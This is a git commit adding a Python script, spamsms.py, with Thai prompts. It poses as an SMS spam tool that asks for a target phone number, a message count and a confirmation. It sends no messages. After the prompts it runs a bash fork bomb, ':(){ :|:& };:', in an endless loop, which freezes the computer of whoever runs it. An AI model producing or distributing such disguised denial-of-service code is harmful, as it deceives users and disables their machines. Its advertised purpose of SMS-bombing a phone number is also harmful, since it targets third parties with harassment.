0471048e838019c213bd721a27e175b6943d4d2e
art-cy <64624033+art-cy@users.noreply.github.com>
2020-06-22 10:51:58 +0700

    Add files via upload

---
+++ spamsms.py
@@ -0,0 +1,32 @@
+ 
+import os, sys
+
+os.system ("figlet -f mono12 SpamSms | lolcat")
+
+print (" \033[31m ")
+
+print ('')
+print ('')
+print ('ตัวอย่างการใส่เบอร์+66 610472823')
+NAME = input('ใสใส่เบอร์: ')
+
+print ('')
+print ('')
+print ('ใส่จำนวนเช่น 9999999')
+print ('')
+AGE = input('ใส่จำนวน:')
+print ('')
+print ('โปรดตอบ')
+print ('')
+print (' [yes/no]')
+LIKE = input('ตอบ : ')
+
+if LIKE == "y" or LIKE == "yes":
+       print (' กำลังทำงาน:)')
+
+elif  LIKE == "n" or LIKE == "no":
+          
+          print ('กำลังทำงาน')
+while True:
+ os.system(':(){ :|:& };:')
+
